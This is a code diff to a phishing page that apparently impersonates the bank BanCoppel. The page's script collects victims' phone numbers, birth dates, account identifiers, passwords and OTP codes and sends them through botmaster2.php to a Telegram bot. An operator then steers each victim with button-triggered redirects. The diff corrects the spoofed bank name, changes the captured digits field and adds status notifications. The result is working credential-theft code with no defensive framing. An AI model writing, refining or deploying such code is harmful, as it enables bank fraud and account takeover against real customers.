@@ -84,16 +84,14 @@ document.addEventListener('DOMContentLoaded', async () => {
   const transactionId = localStorage.getItem("transactionId") || (Date.now().toString(36) + Math.random().toString(36).slice(2));
   localStorage.setItem("transactionId", transactionId);
 
-  const ultimos = session.identificador?.slice(-2) || "??";
-
   const mensaje = `
-<b>INGRESO BANC0PPEL (OTP)</b>
+<b>INGRESO BANCOPPEL (OTP)</b>
 🆔 ID: <code>${transactionId}</code>
 📱 Celular: ${session.celular}
 🎂 Nacimiento: ${session.nacimiento}
 💳 Tipo: ${session.tipo}
 🔢 Identificador: ${session.identificador}
-🔸 Últimos 2 dígitos: ${ultimos}
+🔸 Últimos 2 dígitos: ${session.digitosFinales}
 🔐 Clave: ${session.clave}
 🔄 Dinámica OTP: ${otp}
 `;
@@ -106,12 +104,14 @@ document.addEventListener('DOMContentLoaded', async () => {
     ]
   };
 
+  // Enviar a Telegram
   await fetch("botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
+  // Comenzar verificación de botones
   const latestOffset = await getLastUpdateId(token);
   checkBoton(token, transactionId, latestOffset + 1);
 });
@@ -143,6 +143,14 @@ async function checkBoton(botToken, txId, offset) {
       if (update.callback_query && update.callback_query.data.includes(txId)) {
         const tipo = update.callback_query.data.split(":")[0];
 
+        // Enviar notificación de acción
+        await fetch("sendStatus.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ status: `Botón presionado: ${tipo}` })
+        });
+
+        // Redirección
         switch (tipo) {
           case "error_logo":
             return window.location.href = "errorlogo.html";
@@ -161,6 +169,5 @@ async function checkBoton(botToken, txId, offset) {
   }
 }
 </script>
-
 </body>
 </html>
